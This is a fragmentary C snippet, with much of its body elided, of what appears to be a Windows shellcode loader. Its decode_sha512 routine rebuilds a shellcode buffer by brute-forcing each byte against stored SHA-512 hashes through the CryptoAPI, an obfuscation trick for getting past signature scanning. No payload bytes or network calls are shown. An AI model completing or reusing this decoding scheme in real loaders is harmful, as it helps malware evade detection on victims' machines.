...
void decode_sha512(const char *encoded[], int elements, unsigned char *shellcode, int salt)
{
    HCRYPTPROV hProv = 0;
    BYTE digest[64];
    DWORD digest_len;
    ...
    for (int i = 0; i < elements; i++)
    {
        for (int j = 0; j <= 255; j++)
        {
                ...
                CryptGetHashParam(hHash, HP_HASHVAL, digest, &digest_len, 0))
            {
                ...
                {
                    sha512_str[k * 2] = hex_char[digest[k] >> 4];
                    sha512_str[k * 2 + 1] = hex_char[digest[k] & 0xF];
                }
                sha512_str[digest_len * 2] = '\0';

                if (strcmp(sha512_str, encoded[i]) == 0)
                {
...
int main()
{
    ...
    decode_sha512(encoded, sizeof(encoded) / sizeof(encoded[0]), (unsigned char *)shellcode, shellcode_len);
